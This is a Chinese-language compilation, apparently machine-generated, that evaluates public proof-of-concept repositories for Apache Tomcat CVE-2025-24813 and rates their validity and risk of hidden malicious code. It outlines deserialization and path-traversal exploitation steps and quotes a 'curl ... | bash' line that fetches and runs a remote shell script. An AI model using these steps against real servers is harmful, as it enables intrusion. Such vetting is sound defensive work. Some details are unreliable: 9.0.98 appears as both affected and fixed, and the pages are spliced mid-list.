**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

